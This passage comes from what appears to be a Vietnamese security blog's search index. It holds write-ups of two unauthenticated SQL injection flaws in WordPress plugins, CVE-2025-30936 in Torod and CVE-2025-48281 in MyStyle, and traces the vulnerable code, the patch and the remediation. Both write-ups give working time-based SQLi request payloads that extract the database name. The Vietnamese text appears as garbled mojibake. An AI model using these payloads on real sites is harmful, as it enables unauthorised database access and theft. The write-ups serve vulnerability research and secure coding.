ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action\nwp_ajax_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities.\nNh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë\naction=wp_ajax_nopriv_get_regions_and_cities\u0026amp;country_id=payload_here: Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Torod Plugin \u0026lt;= 1.9 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-30936/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTorod\u003c/strong\u003e c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-30936\"\u003eCVE-2025-30936\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/torod/\"\u003eWordPress Torod Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFixed in\u003c/strong\u003e: \u0026lt;= N/A\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTorod\u003c/strong\u003e: v1.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-30936"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin MyStyle Custom Product Designer c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.21.2. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging MyStyle Custom Product Designer: v3.21.1(vul) v√† v3.21.2(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i MyStyle Custom Product Designer Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file includes/entities/class-mystyle-designmanager.php\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $order = \u0026#39; ORDER BY \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order .= ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? \u0026#39; \u0026#39; . sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39; ASC\u0026#39;; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.1\u0026rdquo; }\nD·ªØ li·ªáu t·ª´ $_GET['orderby'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() v√† wp_unslash() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c lo·∫°i b·ªè k√Ω t·ª± ho·∫∑c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\npublic static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( \u0026#39;WHERE\u0026#39;, $user ); if ( ! empty( $_GET[\u0026#39;orderby\u0026#39;] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET[\u0026#39;orderby\u0026#39;] ) ); $order = ! empty( $_GET[\u0026#39;order\u0026#39;] ) ? sanitize_text_field( wp_unslash( $_GET[\u0026#39;order\u0026#39;] ) ) : \u0026#39;ASC\u0026#39;; // Validate order direction to prevent SQL injection. $allowed_orderby = array( \u0026#39;ms_design_id\u0026#39;, \u0026#39;ms_title\u0026#39;, \u0026#39;ms_access\u0026#39;, \u0026#39;ms_email\u0026#39;, \u0026#39;ms_date_created\u0026#39;, \u0026#39;ms_date_modified\u0026#39;, ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : \u0026#39;ms_design_id\u0026#39;; $order = in_array( strtoupper( $order ), array( \u0026#39;ASC\u0026#39;, \u0026#39;DESC\u0026#39; ), true ) ? $order : \u0026#39;ASC\u0026#39;; $order = \u0026#39; ORDER BY \u0026#39; . $orderby . \u0026#39; \u0026#39; . $order; } else { $order = \u0026#39; ORDER BY ms_design_id DESC\u0026#39;; } $results = $wpdb-\u0026gt;get_results( $wpdb-\u0026gt;prepare( \u0026#39;SELECT * \u0026#39; . \u0026#34;FROM {$wpdb-\u0026gt;prefix}mystyle_designs \u0026#34; . $where . $order . \u0026#39; LIMIT %d OFFSET %d\u0026#39;, array( $per_page, ( $page_number - 1 ) * $per_page, ) ), \u0026#39;OBJECT\u0026#39; ); // other logic } {: file=\u0026ldquo;includes/entities/class-mystyle-designmanager.php v3.21.2\u0026rdquo; }\nB·∫£n v√° s·ª≠ d·ª•ng while list $allowed_orderby ƒë·ªÉ quy ƒë·ªãnh r√µ c√°c c·ªôt ƒë∆∞·ª£c ph√©p s·∫Øp x·∫øp. N·∫øu gi√° tr·ªã orderby kh√¥ng n·∫±m trong danh s√°ch h·ª£p l·ªá th√¨ s·∫Ω b·ªã thay th·∫ø b·∫±ng m·∫∑c ƒë·ªãnh 'ms_design_id' =\u0026gt; ch·∫∑n kh·∫£ nƒÉng ch√®n payload ƒë·ªôc l·∫°i.\nHow it work? L·ªó h·ªïng n·∫±m trong h√†m get_designs c·ªßa class MyStyle_DesignManager thu·ªôc file includes/entities/class-mystyle-designmanager.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_designs trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_designs ƒë∆∞·ª£c g·ªçi trong get_items, init_index_request v√† c√°c h√†m test kh√¥ng ƒë√°ng quan t√¢m\nV√¨ ƒë√¢y l√† l·ªói h·ªïng unauthenticated n√™n c·∫ßn ki·ªÉm tra ch√≠nh x√°c h√†m n√†o kh√¥ng c·∫ßn x√°c th·ª±c ng∆∞·ªùi d√πng.\nget_items() Function get_items n·∫±m trong class MyStyle_Wp_Rest_Api_Design_Controller thu·ªôc file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. get_items ƒë∆∞·ª£c h√†m register_routes trong c√πng class s·ª≠ d·ª•ng l√†m callback c·ªßa REST API th√¥ng qua h√†m register_rest_route() trong WordPress.\npublic function register_routes() { $version = \u0026#39;2\u0026#39;; $vendor = \u0026#39;wc-mystyle\u0026#39;; $namespace = $vendor . \u0026#39;/v\u0026#39; . $version; $base = \u0026#39;designs\u0026#39;; register_rest_route( $namespace, \u0026#39;/\u0026#39; . $base, array( array( \u0026#39;methods\u0026#39; =\u0026gt; WP_REST_Server::READABLE, // GET \u0026#39;callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items\u0026#39; ), \u0026#39;permission_callback\u0026#39; =\u0026gt; array( $this, \u0026#39;get_items_permissions_check\u0026#39; ), \u0026#39;args\u0026#39; =\u0026gt; array(), ) ) ) // other logic } {: file=\u0026ldquo;includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php v3.21.1\u0026rdquo; }\nTuy nhi√™n tr∆∞·ªõc khi callback ƒë∆∞·ª£c g·ªçi, c·∫ßn ph·∫£i check permissions b·∫±ng h√†m get_items_permissions_check, ta c·∫ßn ph·∫£i bi·∫øt anonymoust user c√≥ ƒë∆∞·ª£c g·ªçi api n√†y kh√¥ng. T√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_items_permissions_check.\nüëâ get_items_permissions_check g·ªçi ƒë·∫øn wc_rest_check_manager_permissions ƒë·ªÉ ki·ªÉm tra quy·ªÅn v·ªõi $object = 'settings'. ƒê·ªÉ hi·ªÉu h√†m n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng nh∆∞ th·∫ø n√†o, ta c·∫ßn t√¨m ki·∫øm theo t·ª´ kh√≥a wc_rest_check_manager_permissions trong to√†n b·ªô th∆∞ m·ª•c plugin, b·ªüi v√¨ h√†m n√†y kh√¥ng ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a tr·ª±c ti·∫øp trong plugin hi·ªán t·∫°i.\nwc_rest_check_manager_permissions ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a trong plugin WooCommerce settings mapping th√†nh manage_woocommerce G·ªçi current_user_can( 'manage_woocommerce' ) ƒë·ªÉ ki·ªÉm tra quy·ªÅn c·ªßa user =\u0026gt; Ch·ªâ Admin (ho·∫∑c user c√≥ quy·ªÅn manage_woocommerce). üëâ V√¨ v·∫≠y ta kh√¥ng th·ªÉ khai th√°c t·ª´ h√†m get_items =\u0026gt; khai th√°c h√†m t·ª´ h√†m init_index_request\ninit_index_request() Function init_index_request n·∫±m trong class MyStyle_Design_Profile_Page thu·ªôc file includes/pages/class-mystyle-design-profile-page.php\nƒêo·∫°n code tr∆∞·ªõc khi g·ªçi h√†m get_designs kh√¥ng c√≥ g√¨ li√™n quan ƒë·∫øn x√°c th·ª±c ng∆∞·ªùi d√πng n√™n kh√¥ng c·∫ßn quan t√¢m ph·∫ßn ph√≠a sau. init_index_request ƒë∆∞·ª£c h√†m init trong c√πng class g·ªçi.\npublic function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Ch·ªâ ho·∫°t ƒë·ªông khi c√°c bi·∫øn trong POST request sau ƒë∆∞·ª£c truy·ªÅn =\u0026gt; kh√¥ng quan t√¢m if( isset( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ) \u0026amp;\u0026amp; wp_verify_nonce( sanitize_key( $_POST[\u0026#39;delete_design_nonce\u0026#39;] ), \u0026#39;mystyle_delete_design_nonce\u0026#39; ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( \u0026#39;administrator\u0026#39; ) || MyStyle_DesignManager::is_user_design_owner( $this-\u0026gt;user-\u0026gt;ID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u0026gt;set_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u0026gt;delete_design_success_message = \u0026#39;Design has been successfully deleted.\u0026#39;; } } } if ( false === $design_id || preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_profile_page-\u0026gt;init_index_request(); } else { $design_profile_page-\u0026gt;init_design_request( $design_id ); } } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nƒê·ªÉ init_index_request ƒë∆∞·ª£c g·ªçi th√¨ c√¢u ƒëi·ªÅu ki·ªán if ph·∫£i x·∫£y ra, ta c·∫ßn ph·∫£i bi·∫øt $design_id l√† g√¨, t√¨m ki·∫øm h√†m get_design_id_from_url trong c√πng class, v√¨ n√≥ ƒë∆∞·ª£c g·ªçi b·∫±ng self v√† g√°n gi√° tr·ªã cho $design_id\npublic static function get_design_id_from_url() { // Try the query vars ( ex: \u0026amp;design_id=10 ). $design_id = get_query_var( \u0026#39;design_id\u0026#39; ); if ( preg_match( \u0026#39;/page/\u0026#39;, $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /designs/10. -------- // phpcs:ignore $path = $_SERVER[\u0026#39;REQUEST_URI\u0026#39;]; // Get the design profile page\u0026#39;s WP_Post slug. /* @var $post \\WP_Post phpcs:ignore */ $post = get_post( self::get_id() ); $slug = $post-\u0026gt;post_name; $pattern = \u0026#39;/^.*\\/\u0026#39; . $slug . \u0026#39;\\/([\\d]+)/\u0026#39;; if ( preg_match( $pattern, $path, $matches ) ) { $design_id = $matches[1]; } else { $design_id = false; } // ------------------------------------- } return $design_id; } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\nüëâ H√†m n√†y l·∫•y design_id t·ª´ url n√™n khi kh√¥ng th√™m n√≥ v√†o url khi g·ª≠i request =\u0026gt; if x·∫£y ra =\u0026gt; init_index_request ƒë∆∞·ª£c g·ªçi.\nQuay tr·ªü l·∫°i h√†m init, n√≥ ƒë∆∞·ª£c g·ªçi trong __construct c·ªßa c√πng class.\npublic function __construct() { // other logic add_action( \u0026#39;init\u0026#39;, array( \u0026amp;$this, \u0026#39;rewrite_rules\u0026#39; ) ); add_action( \u0026#39;template_redirect\u0026#39;, array( \u0026amp;$this, \u0026#39;init\u0026#39; ) ); } {: file=\u0026ldquo;includes/pages/class-mystyle-design-profile-page.php v3.21.1\u0026rdquo; }\ninit l√† callback g·∫Øn v√†o hook template_redirect: l√† m·ªôt action hook trong WordPress, ch·∫°y tr∆∞·ªõc khi n·ªôi dung template th·ª±c s·ª± ƒë∆∞·ª£c load v√† hi·ªÉn th·ªã ra tr√¨nh duy·ªát.\nPh√≠a tr√™n hook template_redirect trong __construct c√≤n c√≥ hook init, n√≥ s·∫Ω ch·∫°y tr√™n m·ªói request v·ªõi callback rewrite_rules:\npublic function rewrite_rules() { // Flush rewrite rules for newly created rewrites. flush_rewrite_rules(); add_rewrite_rule( \u0026#39;designs/([a-zA-Z0-9_-].+)?$\u0026#39;, // designs/{slug} \u0026#39;index.php?pagename=designs\u0026amp;design_id=$matches[1]\u0026#39;, \u0026#39;top\u0026#39; ); } H√†m n√†y th√™m route /designs/{id} ƒë·ªÉ load trang designs v√† truy·ªÅn bi·∫øn design_id.\nüëâ Nh∆∞ v·∫≠y khi truy c·∫≠p v√†o /designs/:\nCallback rewrite_rules ƒë∆∞·ª£c g·ªçi, WordPress s·∫Ω load /index.php?pagename=designs\u0026amp;design_id=. design_id kh√¥ng c√≥ gi√° tr·ªã n√™n get_design_id_from_url ƒë∆∞·ª£c g√°n cho $design_id s·∫Ω l√† false =\u0026gt; ƒëi·ªÅu ki·ªán false === $design_id x·∫£y ra khi·∫øn init_index_request trong kh·ªëi if ƒë∆∞·ª£c g·ªçi. init_index_request g·ªçi ƒë·∫øn get_designs get_designs l·∫•y tr·ª±c ti·∫øp orderby t·ª´ GET request th√™m v√†o c√¢u query ƒë·ªÉ th·ª±c thi Exploit Detect SQLi G·ª≠i GET request ch·ª©a payload SQLi.\nGET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nTrong tr∆∞·ªùng h·ª£p n√†y kh√¥ng n√™n comment ph√≠a sau SLEEP. V√¨ developer ƒë√£ enter khi·∫øn OFFSET xu·ªëng d√≤ng th·ª© 2, khi comment ho·∫°t ƒë·ªông, parser c·ªßa SQL s·∫Ω x·ª≠ l√Ω v√† tr·∫£ v·ªÅ l·ªói. {: .prompt-info }\nCu·ªói c√πng s·∫Ω ƒë∆∞·ª£c t√°ch th√†nh 2 c√¢u query ·ªü 2 d√≤ng kh√°c nhau g√¢y ra l·ªói:\nSELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25\tOFFSET 0 Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nGET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ orderby ƒë∆∞·ª£c l·∫•y t·ª´ GET request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nAutomatic Extraction D·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript Here\nConclusion L·ªó h·ªïng CVE-2025-48281 trong plugin WordPress MyStyle Custom Product Designer tr∆∞·ªõc phi√™n b·∫£n 3.21.2 xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nB·∫£n v√° ch√≠nh th·ª©c ƒë√£ tri·ªÉn khai white list, gi√∫p ƒë·∫£m b·∫£o d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c ki·ªÉm so√°t v√† an to√†n h∆°n.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress MyStyle Custom Product Designer Plugin \u0026lt;= 3.21.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-09-cve-2025-48281/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eMyStyle Custom Product Designer\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.21.2\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48281\"\u003eCVE-2025-48281\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/mystyle-custom-product-designer\"\u003eWordPress MyStyle Custom Product Designer Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.21.1\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and 